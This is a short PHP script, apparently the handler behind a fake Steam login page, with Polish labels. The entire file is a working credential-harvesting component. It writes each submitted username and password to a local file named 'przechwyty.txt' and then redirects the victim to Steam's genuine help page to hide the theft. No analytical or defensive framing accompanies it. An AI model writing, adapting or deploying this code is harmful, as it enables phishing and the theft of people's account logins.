<?php

file_put_contents("przechwyty.txt", "Steam Login: " . $_POST['username'] . " Hasło: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://help.steampowered.com/en/wizard/HelpWithLoginInfo/');
exit();
?>